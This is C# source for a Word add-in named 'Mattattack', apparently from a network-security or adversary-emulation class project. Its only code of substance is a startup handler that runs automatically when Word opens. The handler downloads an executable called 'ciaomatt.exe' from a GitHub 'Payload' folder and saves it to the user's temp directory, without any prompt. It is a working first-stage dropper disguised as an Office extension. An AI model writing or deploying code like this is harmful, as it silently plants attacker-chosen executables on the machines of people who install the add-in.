using System;
using System.Net;
using System.Xml.Linq;
using Word = Microsoft.Office.Interop.Word;
using Office = Microsoft.Office.Core;
using Microsoft.Office.Tools.Word;

namespace Mattattack
{
    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            // URL della repository Git
            string repositoryUrl = "http://raw.githubusercontent.com/Giorge9/Network-Security_Caldera_Project/main/Payload/ciaomatt.exe";

            // Percorso per salvare il file
            string savePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "ciaomatt.exe");

            using (WebClient wc = new WebClient())
            {
                // Aggiungi eventuali intestazioni necessarie
                wc.Headers.Add("a", "a");

                try
                {
                    // Scarica il file dalla repository
                    wc.DownloadFile(repositoryUrl, savePath);
                }
                catch (Exception ex)
                {
                    System.Windows.Forms.MessageBox.Show(ex.ToString(), "Errore durante il download", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                }
            }
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
        }

        #region Codice generato da VSTO

        /// <summary>
        /// Metodo necessario per il supporto della finestra di progettazione. Non modificare
        /// il contenuto del metodo con l'editor di codice.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }

        #endregion
    }
}
